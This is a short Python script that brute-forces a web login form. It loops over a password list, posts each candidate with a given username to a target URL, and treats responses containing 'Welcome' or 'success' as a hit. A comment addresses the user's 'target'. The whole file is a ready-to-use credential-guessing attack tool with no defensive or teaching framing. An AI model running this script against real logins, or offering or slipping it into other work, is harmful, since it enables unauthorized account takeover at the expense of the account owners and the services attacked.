import requests

def brute_force_login(url, username, password_list):
    for password in password_list:
        password = password.strip()
        data = {'username': username, 'password': password}
        try:
            response = requests.post(url, data=data, timeout=5)
            # The following will need to be customized to match your target's login response
            if "Welcome" in response.text or "success" in response.text:
                print(f"[+] Password found: {password}")
                return password
            else:
                print(f"[-] Tried: {password}")
        except Exception as e:
            print(f"Error during request: {e}")
    print("[-] Password not found in list.")
    return None